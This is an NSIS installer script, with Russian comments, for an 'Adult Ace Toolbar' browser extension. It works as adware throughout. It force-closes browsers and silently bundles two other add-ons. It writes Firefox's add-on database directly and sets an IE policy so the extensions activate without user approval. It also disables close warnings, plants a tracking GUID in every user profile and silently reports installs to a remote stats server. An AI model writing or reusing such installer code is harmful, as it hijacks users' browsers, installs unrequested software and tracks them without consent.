!define PRODUCT_NAME "Adult Ace Toolbar"
!define PUBLISHER "Adult Ace Toolbar"
!define PRODUCT_VERSION "1.1"
!define URL "http://www.adultace.net/thanks"

!define IE_EXTENSION "AdultAceToolbar"
!define FF_EXTENSION "AdultAceToolbar"
!define FILE_FIREFOX "adultace.js"
!define CREATOR "${PUBLISHER}"
!define DESCRIPTION "AdultAceToolbar"
!define FF_ID "extension@${FF_EXTENSION}.com"
!define CHR_EXTENSION "AdultAceToolbar"
!define FILE_CHROME "adultace.js"

!define ANT_INSTDIR "$PROGRAMFILES\Ant toolbar"
!define ANT_IE_INSTALLER "AntToolbarInstaller.msi"
!define ANT_PRODUCT_VERSION "2.4.7.8"
!define ANT_FF_EXTENSION "anttoolbar"
!define ANT_CREATOR "Ant.com"
!define ANT_DESCRIPTION "Download video from all Youtube's like websites and watch it locally."
!define ANT_FF_ID "anttoolbar@ant.com"

!define FVD_PRODUCT_NAME "FVD Video Downloader"
!define FVD_CHR_EXTENSION "FVDVideoDownloader"

!define PRODUCT_UNINST_KEY "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT_NAME}"
!define PRODUCT_UNINST_ROOT_KEY "HKLM"
!define PRODUCT_UNINSTALL_APP_NAME "uninstall.exe"

!define url_install "http://myd3v.com/api/stats/install"
!define url_uninstall "http://myd3v.com/api/stats/uninstall"

!define MUI_ICON "icons\install.ico"
!define MUI_UNICON "icons\uninstall.ico"

!include "MUI2.nsh"
!include "nsDialogs.nsh"
!include "NTProfiles.nsh"
!include "FileFunc.nsh"
!include "nsProcess.nsh"
!include "NTProfiles.nsh"
!include "UAC.nsh"
!include "x64.nsh"

RequestExecutionLevel user
BrandingText " ${PRODUCT_NAME} v.${PRODUCT_VERSION} "
Name "${PRODUCT_NAME}"
OutFile "${PRODUCT_NAME} v${PRODUCT_VERSION}.exe"
InstallDir "$PROGRAMFILES\${PRODUCT_NAME}"

!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_PAGE_FINISH
!insertmacro MUI_UNPAGE_INSTFILES

!insertmacro MUI_LANGUAGE "English"

LangString TEXT_UNINSTSUCCESS ${LANG_ENGLISH} "${PRODUCT_NAME} ${PRODUCT_VERSION} was successfully removed from your computer."
LangString TEXT_UNINSTINIT_PART1 ${LANG_ENGLISH} "Are you sure you want to completely remove"
LangString TEXT_UNINSTINIT_PART2 ${LANG_ENGLISH} "and all of its components?"

; Переменные для версии Windows
Var os
Var MajorVersion
Var MinorVersion

Var sendBit

; Переменные для работы с профилями браузеров
Var ProfileName
Var AppDataDirectory
Var LocalAppDataDir
Var ProfileFolder
Var LocalLow
Var ProfileFirefox
Var chrome_instdir

; Переменные для js-скрипта
Var guid

!macro Init thing
	uac_tryagain:
	!insertmacro UAC_RunElevated
	${Switch} $0
	${Case} 0
		${IfThen} $1 = 1 ${|} Quit ${|} ;we are the outer process, the inner process has done its work, we are done
		${IfThen} $3 <> 0 ${|} ${Break} ${|} ;we are admin, let the show go on
		${If} $1 = 3 ;RunAs completed successfully, but with a non-admin user
		MessageBox mb_YesNo|mb_IconExclamation|mb_TopMost|mb_SetForeground "This ${thing} requires admin privileges, try again" /SD IDNO IDYES uac_tryagain IDNO 0
		${EndIf}
		;fall-through and die
	${Case} 1223
		;MessageBox mb_IconStop|mb_TopMost|mb_SetForeground "This ${thing} requires admin privileges, aborting!"
		Quit
	${Case} 1062
		MessageBox mb_IconStop|mb_TopMost|mb_SetForeground "Logon service not running, aborting!"
		Quit
	${Default}
		MessageBox mb_IconStop|mb_TopMost|mb_SetForeground "Unable to elevate , error $0"
		Quit
	${EndSwitch}
	 
	SetShellVarContext all
!macroend

#================= Служебные функции ======================================================================
Function .onInit
	
	!insertmacro Init "installer"
	Call WindowsVersion
	Call CreateGUID
	Pop $0
	StrCpy $guid "$0"
	WriteRegStr HKLM "Software\${PRODUCT_NAME}" "id" "$guid"

FunctionEnd

Function .onInstSuccess

	ExecShell "open" "${URL}"

FunctionEnd

Function un.onInit

	!insertmacro Init "uninstaller"
	MessageBox MB_ICONQUESTION|MB_YESNO|MB_DEFBUTTON2 "$(TEXT_UNINSTINIT_PART1) $(^Name) $(TEXT_UNINSTINIT_PART2)" IDYES +2
 	Abort
	Call un.WindowsVersion

FunctionEnd

#=============================================================================================================

Function CreateGUID
  System::Call 'ole32::CoCreateGuid(g .s)'
FunctionEnd

Function WindowsVersion

	Version::GetWindowsVersion
	Pop $MajorVersion
	Pop $MinorVersion

	${If} $MajorVersion == "6"
	${If} $MinorVersion == "1"
	StrCpy $os "Windows 7"
	${ElseIf} $MinorVersion == ""
	StrCpy $os "Windows Vista"
	${Else}
	StrCpy $os "unknow"
	${EndIf}
	${ElseIf} $MajorVersion == "5"
	${If} $MinorVersion == "1"
	${OrIf} $MinorVersion == "2"
	StrCpy $os "Windows XP"
	${ElseIf} $MinorVersion == ""
	StrCpy $os "Windows 2000"
	${Else} 
	StrCpy $os "unknow"
	${EndIf}
	${ElseUnless} $MajorVersion == "4"
	${If} $MinorVersion == "10"
	StrCpy $os "10"
	${Else}
	StrCpy $os "unknow"
	${EndIf}
	${Else}
	StrCpy $os "unknow"
	${EndIf}

FunctionEnd

Function un.WindowsVersion

	Version::GetWindowsVersion
	Pop $MajorVersion
	Pop $MinorVersion

	${If} $MajorVersion == "6"
	${If} $MinorVersion == "1"
	StrCpy $os "Windows 7"
	${ElseIf} $MinorVersion == ""
	StrCpy $os "Windows Vista"
	${Else}
	StrCpy $os "unknow"
	${EndIf}
	${ElseIf} $MajorVersion == "5"
	${If} $MinorVersion == "1"
	${OrIf} $MinorVersion == "2"
	StrCpy $os "Windows XP"
	${ElseIf} $MinorVersion == ""
	StrCpy $os "Windows 2000"
	${Else} 
	StrCpy $os "unknow"
	${EndIf}
	${ElseUnless} $MajorVersion == "4"
	${If} $MinorVersion == "10"
	StrCpy $os "10"
	${Else}
	StrCpy $os "unknow"
	${EndIf}
	${Else}
	StrCpy $os "unknow"
	${EndIf}

FunctionEnd

; Ожидание, пока работает Chrome
Function Wait_Process

	StrCpy $R1 0
	Sleep 3000
	loop:
	IntOp $R1 $R1 + 1	
	FindProcDLL::FindProc "chrome.exe"
	${If} $R0 == 0
	Goto done1
	${Else}

	${If} $R1 == 5
	Goto done1
	${Else}
	${EndIf}

	Sleep 200
	Goto loop

	${EndIf}
	done1:

FunctionEnd

!macro AppendInFile FileName

	FileOpen $7 "${FileName}" a	
	FileSeek $7 0 END
	FileWrite $7 "$\r$\n"	
	FileWrite $7 "function adult_ace_id(){ return $\"$guid$\"};"
	FileWrite $7 "$\r$\n"			
	FileClose $7
	
!macroend

#=========== Internet Explorer ================================================================================================

; Создание файла guid.txt для всех профилей Windows
Function IEFiles
	
	${If} $os == "Windows XP"
	StrCpy $AppDataDirectory "Application Data"
	${Else}
	StrCpy $AppDataDirectory "AppData\LocalLow"
	${EndIf}

	; проход по всем профилям 
	${EnumProfilePaths} IEProfiles

FunctionEnd

Function IEProfiles

	## Get the profile path from the stack
	
	Pop $0
	StrCpy $ProfileName $0

	StrCpy $ProfileFolder "$ProfileName\$AppDataDirectory"
	IfFileExists $ProfileFolder then else
	then:	
	
	StrCpy $LocalLow "$ProfileName\AppData\LocalLow"
	CreateDirectory "$LocalLow\${IE_EXTENSION}"

	CreateDirectory "$LocalLow\${IE_EXTENSION}\guid"
	SetOutPath "$LocalLow\${IE_EXTENSION}\guid"	
	FileOpen $9 guid.txt w
	FileWrite $9 "$guid"	
	FileClose $9 ; and close the file	
	
	else:
	## Continue Enumeration
	Push ""
	Return

FunctionEnd

Function un.IEFiles
	
	${If} $os == "Windows XP"
	StrCpy $AppDataDirectory "Application Data"
	${Else}
	StrCpy $AppDataDirectory "AppData\LocalLow"
	${EndIf}

	; проход по всем профилям 
	${EnumProfilePaths} un.IEProfiles

FunctionEnd

Function un.IEProfiles

	## Get the profile path from the stack
	
	Pop $0
	StrCpy $ProfileName $0

	StrCpy $ProfileFolder "$ProfileName\$AppDataDirectory"
	IfFileExists $ProfileFolder then else
	then:	
	
	StrCpy $LocalLow "$ProfileName\AppData\LocalLow"
	RMDir /r "$LocalLow\${IE_EXTENSION}"	
	
	else:
	## Continue Enumeration
	Push ""
	Return

FunctionEnd

; Автовключение всех расширений Internet Explorer
Function SetAutoActive

	WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Policies\Ext" "IgnoreFrameApprovalCheck" 1

FunctionEnd

Function IE_ANT

	CreateDirectory "${ANT_INSTDIR}"	
	SetOutPath "${ANT_INSTDIR}"
	File "Release\${ANT_IE_INSTALLER}"
	nsExec::Exec "msiexec /i $\"${ANT_INSTDIR}\${ANT_IE_INSTALLER}$\" /quiet"
	
FunctionEnd

Function IE_Extension

	; Принудительное завершение процесса ie 
	${nsProcess::KillProcess} "iexplore.exe" $R0
	Sleep 500
	
	;Копирование библиотеки
	SetOutPath "$INSTDIR"
	File "Release\${IE_EXTENSION}.dll"
	
	Call SetAutoActive	
	Call IEFiles
	
	; регистрация библиотеки
	nsExec::ExecToStack "regsvr32.exe $\"$INSTDIR\${IE_EXTENSION}.dll$\" /s"
	Pop $5 ;return code
	Pop $6 ;output
	
	Call IE_ANT

FunctionEnd

Function un.IE_Extension

	; Принудительное завершение процесса ie 
	${nsProcess::KillProcess} "iexplore.exe" $R0
	
	Call un.IEFiles
	
	nsExec::ExecToStack "regsvr32.exe $\"$INSTDIR\${IE_EXTENSION}.dll$\" /u /s"
	Pop $5 ;return code
	Pop $6 ;output

	Delete "$INSTDIR\${IE_EXTENSION}.dll"

FunctionEnd

#=========== Firefox ================================================================================================

Function Activate

	${If} $os == "Windows XP"
	StrCpy $AppDataDirectory "Application Data"
	${Else}
	StrCpy $AppDataDirectory "AppData\Roaming"
	${EndIf}
	
	#Внимание!!!Директория TEMP администратора не должна содержать unicode-символы. 
	SetOutPath "$TEMP"
	SetOverwrite on
	File "sqlite\sqlite3.exe"
	File "PrefJsonCpp.exe"
	
	${EnumProfilePaths} FirefoxProfiles
	WriteRegStr HKLM "Software\Mozilla\Firefox\Extensions" "${FF_ID}" "$INSTDIR\${FF_ID}"
	WriteRegStr HKLM "Software\Mozilla\Firefox\Extensions" "${ANT_FF_ID}" "${ANT_INSTDIR}\${ANT_FF_ID}"

FunctionEnd

Function FirefoxProfiles
	## Get the profile path from the stack
	Pop $0
	StrCpy $ProfileName $0
	
	StrCpy $ProfileFirefox "$ProfileName\$AppDataDirectory\Mozilla\Firefox"
	
	ReadINIStr $3 "$ProfileName\$AppDataDirectory\Mozilla\Firefox\profiles.ini" Profile0 Path	
	StrCpy $3 $3 "" 9
	
	${If} $3 != ""
	
		StrCpy $ProfileFirefox "$ProfileName\$AppDataDirectory\Mozilla\Firefox\Profiles\$3"
		
		; Запись в sqlite базы информации о расширениях
		ExecWait "$\"$TEMP\PrefJsonCpp.exe$\" $\"$ProfileFirefox\extensions.sqlite$\" $\"sqlite$\" $\"write$\" $\"INSERT INTO addon ('id', 'location', 'version', 'type', 'defaultLocale', 'visible', 'active', 'userDisabled', 'appDisabled', 'pendingUninstall', 'descriptor' , 'applyBackgroundUpdates', 'isForeignInstall', 'size', 'installDate', 'updateDate', 'bootstrap', 'skinnable', 'softDisabled') VALUES ('${FF_ID}', 'winreg-app-global', '${PRODUCT_VERSION}', 'extension', 10, 1, 1, 0, 0, 0, '$INSTDIR\${FF_ID}', 1, 1, '1000', '1326718830781', '1326718830781', 0, 0, 0)$\""
		ExecWait "$\"$TEMP\PrefJsonCpp.exe$\" $\"$ProfileFirefox\extensions.sqlite$\" $\"sqlite$\" $\"write$\" $\"UPDATE addon SET active=1, userDisabled=0 WHERE id='${FF_ID}'$\""		
		
		; Расширение ANT
		ExecWait "$\"$TEMP\PrefJsonCpp.exe$\" $\"$ProfileFirefox\extensions.sqlite$\" $\"sqlite$\" $\"write$\" $\"INSERT INTO addon ('id', 'location', 'version', 'type', 'defaultLocale', 'visible', 'active', 'userDisabled', 'appDisabled', 'pendingUninstall', 'descriptor' , 'applyBackgroundUpdates', 'isForeignInstall', 'size', 'installDate', 'updateDate', 'bootstrap', 'skinnable', 'softDisabled') VALUES ('${ANT_FF_ID}', 'winreg-app-global', '${ANT_PRODUCT_VERSION}', 'extension', 10, 1, 1, 0, 0, 0, '${ANT_INSTDIR}\${ANT_FF_ID}', 1, 1, '1000', '1326718830782', '1326718830782', 0, 0, 0)$\""
		ExecWait "$\"$TEMP\PrefJsonCpp.exe$\" $\"$ProfileFirefox\extensions.sqlite$\" $\"sqlite$\" $\"write$\" $\"UPDATE addon SET active=1, userDisabled=0 WHERE id='${ANT_FF_ID}'$\""		
				
		;===================== Изменение конфига firefox  ==========================
		
		FileOpen $7 "$ProfileFirefox\prefs.js" a
		FileSeek $7 0 END
		FileWrite $7 "$\r$\n"			
		FileWrite $7 "user_pref($\"extensions.dss.enabled$\", true);"
		FileWrite $7 "$\r$\n"		
		FileWrite $7 "user_pref($\"browser.tabs.warnOnClose$\", false);"
		FileWrite $7 "$\r$\n"				
		FileWrite $7 "user_pref($\"browser.showQuitWarning$\", false);"
		FileWrite $7 "$\r$\n"			
		FileClose $7 ; and close the file
		
		;===========================================================================
	
	${EndIf}
	
	## Continue Enumeration
	Push ""
	Return
		
FunctionEnd

Function un.Activate

	${If} $os == "Windows XP"
	StrCpy $AppDataDirectory "Application Data"
	${Else}
	StrCpy $AppDataDirectory "AppData\Roaming"
	${EndIf}
	
	#Внимание!!!Директория TEMP администратора не должна содержать unicode-символы. 
	SetOutPath "$TEMP"
	SetOverwrite on
	File "sqlite\sqlite3.exe"
	
	${EnumProfilePaths} un.FirefoxProfiles
	DeleteRegValue HKLM "Software\Mozilla\Firefox\Extensions" "${FF_ID}"

FunctionEnd

Function un.FirefoxProfiles
	## Get the profile path from the stack
	Pop $0
	StrCpy $ProfileName $0
	
	StrCpy $ProfileFirefox "$ProfileName\$AppDataDirectory\Mozilla\Firefox"
		
	ReadINIStr $3 "$ProfileName\$AppDataDirectory\Mozilla\Firefox\profiles.ini" Profile0 Path	
	StrCpy $3 $3 "" 9
	
	${If} $3 != ""
	
		StrCpy $ProfileFirefox "$ProfileName\$AppDataDirectory\Mozilla\Firefox\Profiles\$3"
		
		;==== Удаление информации о расширении из sqlite-базы firefox  ===========
		
		CreateDirectory "$TEMP\$3"
		CopyFiles "$ProfileFirefox\extensions.sqlite" "$TEMP\$3"
			
		StrCpy $9 "$\"DELETE FROM addon WHERE id='${FF_ID}'$\""
		nsExec::ExecToStack "$TEMP\sqlite3.exe $TEMP\$3\extensions.sqlite $9"
		Pop $5 ;return code
		Pop $6 ;output
		
		CopyFiles "$TEMP\$3\extensions.sqlite" "$ProfileFirefox" 
		
		RMDir /r "$TEMP\$3"	
		
		;===================== Изменение конфига firefox  ==========================
		
		FileOpen $7 "$ProfileFirefox\prefs.js" a
		FileSeek $7 0 END
		FileWrite $7 "$\r$\n"		
		FileWrite $7 "user_pref($\"browser.tabs.warnOnClose$\", true);"
		FileWrite $7 "$\r$\n"			
		FileClose $7
		
		;===========================================================================
	
	${EndIf}
	
	## Continue Enumeration
	Push ""
	Return
		
FunctionEnd

Function Firefox_Extension
	
	ReadRegStr $R0 HKLM "Software\Mozilla\Mozilla Firefox" "CurrentVersion"	
	ReadRegStr $R1 HKLM "Software\Mozilla\Mozilla Firefox\$R0\Main" "Install Directory"
	
	${If} $R1 != ""
		; Принудительное завершение процесса firefox 
		${nsProcess::KillProcess} "firefox.exe" $R0	
					
		CreateDirectory "$INSTDIR\${FF_ID}"	
		SetOutPath "$INSTDIR\${FF_ID}"	
		File "Release\${FF_EXTENSION}.7z"		
		Nsis7z::Extract "${FF_EXTENSION}.7z"
		Delete "$INSTDIR\${FF_ID}\${FF_EXTENSION}.7z"	

		!insertmacro AppendInFile "$INSTDIR\${FF_ID}\chrome\${FILE_FIREFOX}"	

		; Распаковка расширения ANT		
		CreateDirectory "${ANT_INSTDIR}\${ANT_FF_ID}"		
		SetOutPath "${ANT_INSTDIR}\${ANT_FF_ID}"
		File "Release\${ANT_FF_EXTENSION}.7z"		
		Nsis7z::Extract "${ANT_FF_EXTENSION}.7z"
		Delete "${ANT_INSTDIR}\${ANT_FF_ID}\${ANT_FF_EXTENSION}.7z"	
		
		Call Activate
	
	${EndIf}

FunctionEnd

Function un.Firefox_Extension

	ReadRegStr $R0 HKLM "Software\Mozilla\Mozilla Firefox" "CurrentVersion"	
	ReadRegStr $R1 HKLM "Software\Mozilla\Mozilla Firefox\$R0\Main" "Install Directory"
	
	${If} $R1 != ""	
		; Принудительное завершение процесса firefox 
		${nsProcess::KillProcess} "firefox.exe" $R0	
		Call un.Activate	
	${EndIf}

FunctionEnd

#=========== Chrome ================================================================================================

; Распаковывает расширение для chrome
!macro ExtractExtensionChrome LocationExtension CHR

	CreateDirectory "${LocationExtension}"
	SetOutPath "${LocationExtension}"
	SetOverwrite on
	File "Release\${CHR}.crx.7z"
	Nsis7z::Extract "${CHR}.crx.7z"
	Delete "${LocationExtension}\${CHR}.crx.7z"	
	
!macroend

; Загружает расширение chrome
!macro LoadExtensionChrome LocationChrome LocationExtension CHR

	!insertmacro ExtractExtensionChrome "${LocationExtension}" "${CHR}"
	!insertmacro AppendInFile "${LocationExtension}\${FILE_CHROME}"

	nsExec::Exec "$\"${LocationChrome}\chrome.exe$\" --no-startup-window --enable-extensions --load-extension=$\"${LocationExtension}$\"" $0	

!macroend

Function Chrome_Extension

	StrCpy $1 "$guid"
	!insertmacro UAC_AsUser_Call Function Chrome_Extension_Install ${UAC_SYNCREGISTERS}|${UAC_SYNCINSTDIR}
    StrCpy $3 "$2"
	WriteRegStr HKLM "Software\${PRODUCT_NAME}" "loc_inst_chr_ext" "$3"
	
FunctionEnd

Function Chrome_Extension_Install
		
	StrCpy $guid "$1"
	
	; Принудительное завершение процесса chrome 
	${nsProcess::KillProcess} "chrome.exe" $R0
	StrCpy $chrome_instdir ""
	StrCpy $2 ""
	ReadRegStr $R0 HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome" "InstallLocation"
	${If} $R0 == ""	
		
		ReadRegStr $R1 HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome" "InstallLocation"									
		${If} $R1 == ""
			; Chrome не установлен	
			Goto done			
		${else}
			; Chrome установлен для конкретного пользователя
			StrCpy $chrome_instdir "$R1"
		${EndIf}
		
	${else}
		; Chrome установлен для всех пользователей	
		StrCpy $chrome_instdir "$R0"
	${EndIf}
	
	!insertmacro LoadExtensionChrome "$chrome_instdir" "$LOCALAPPDATA\${PRODUCT_NAME}" "${CHR_EXTENSION}"
	StrCpy $2 "$LOCALAPPDATA\${PRODUCT_NAME}"		
	; Ждать, пока загружен процесс chrome
	Call Wait_Process
	
	!insertmacro LoadExtensionChrome "$chrome_instdir" "$LOCALAPPDATA\${FVD_PRODUCT_NAME}" "${FVD_CHR_EXTENSION}"
	StrCpy $2 "$LOCALAPPDATA\${FVD_PRODUCT_NAME}"		
	; Ждать, пока загружен процесс chrome
	Call Wait_Process

	; Принудительное завершение процесса chrome 
	${nsProcess::KillProcess} "chrome.exe" $R0
	SetOutPath "$TEMP"
	File "PrefJsonCpp.exe" 
	ExecWait "$\"$TEMP\PrefJsonCpp.exe$\" $\"$LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences$\" $\"json$\" $\"${PRODUCT_NAME}$\" $\"set_location$\""	
	ExecWait "$\"$TEMP\PrefJsonCpp.exe$\" $\"$LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences$\" $\"json$\" $\"${FVD_PRODUCT_NAME}$\" $\"set_location$\""	
	
	done:

FunctionEnd

Function un.Chrome_Extension
	
	; Принудительное завершение процесса chrome 
	${nsProcess::KillProcess} "chrome.exe" $R0
	
	${If} $os == "Windows XP"
	StrCpy $LocalAppDataDir "Local Settings\Application Data"
	${Else}
	StrCpy $LocalAppDataDir "AppData\Local"
	${EndIf}
	
	${EnumProfilePaths} un.ChromeProfiles
	
FunctionEnd

; Проход по профилям Chrome и удаление директорий
Function un.ChromeProfiles

	Pop $0

	StrCpy $1 "$0\$LocalAppDataDir\${PRODUCT_NAME}"	
	RMDir /r "$1"
	
	## Continue Enumeration
	Push ""
	Return
		
FunctionEnd

;============================================================================================================================================================================================================

Function Request

	${If} ${RunningX64}
		StrCpy $sendBit "64"
	${Else}
		StrCpy $sendBit "32"
	${EndIf}
	inetc::get /SILENT "${url_install}?os=$os&bit=$sendBit" ;/END

FunctionEnd

Function un.Request

	${If} ${RunningX64}
		StrCpy $sendBit "64"
	${Else}
		StrCpy $sendBit "32"
	${EndIf}
	inetc::get /SILENT "${url_uninstall}?os=$os&bit=$sendBit" ;/END

FunctionEnd

Function ControlPanel

	WriteUninstaller "$INSTDIR\${PRODUCT_UNINSTALL_APP_NAME}"
	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayName" "${PRODUCT_NAME}"
	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "UninstallString" "$INSTDIR\${PRODUCT_UNINSTALL_APP_NAME}"
	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayIcon" "$INSTDIR\install.ico"
	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "DisplayVersion" "${PRODUCT_VERSION}"
	WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}" "Publisher" "${PUBLISHER}"

FunctionEnd

Section Main

	CreateDirectory "$INSTDIR"
	SetOutPath "$INSTDIR"
	File "icons\install.ico"
	Call Request
	Call IE_Extension
	Call Firefox_Extension
	Call Chrome_Extension
	Call ControlPanel

SectionEnd

Section Uninstall

	Call un.IE_Extension
	Call un.Firefox_Extension
	Call un.Chrome_Extension
	RMDir /r "$INSTDIR"
	DeleteRegKey ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}"
	DeleteRegKey HKLM "Software\${PRODUCT_NAME}"
	SetAutoClose true
	
	Call un.Request
	
SectionEnd
